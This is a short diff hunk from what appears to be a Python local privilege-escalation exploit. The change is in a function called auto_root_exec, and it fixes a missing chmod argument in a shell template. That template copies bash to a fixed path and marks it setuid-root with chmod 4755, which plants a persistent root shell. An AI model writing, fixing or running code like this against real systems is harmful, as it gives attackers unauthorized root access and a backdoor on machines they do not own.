@@ -393,7 +393,7 @@ def auto_root_exec(binary):
             "{cp} {bash} {dst} && "
             "{chmod} 4755 {dst}\n"
             "exit 0\n"
-        ).format(cp=cp_bin, bash=bash, dst=PK_SUID).encode()
+        ).format(cp=cp_bin, bash=bash, dst=PK_SUID, chmod=chmod_bin).encode()
 
         r_fd, w_fd = os.pipe()
         pid = os.fork()
